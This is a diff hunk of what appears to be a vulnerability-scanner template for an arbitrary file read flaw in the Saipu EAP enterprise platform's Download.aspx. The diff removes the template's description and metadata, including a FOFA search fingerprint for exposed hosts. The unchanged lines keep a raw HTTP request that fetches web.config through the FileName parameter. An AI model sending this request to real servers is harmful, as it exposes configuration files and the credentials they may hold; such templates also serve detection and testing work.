@@ -3,12 +3,8 @@ info:
   name: 赛普EAP企业适配管理平台 Download.aspx 任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/axhq9su3tby9xsgr'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: axhq9su3tby9xsgr
-    fofa: body="IDWebSoft/"
 http:
 - raw:
   - 'GET /IDWebSoft/Common/Handler/Download.aspx?FileName=web.config&FileTitle= HTTP/1.1
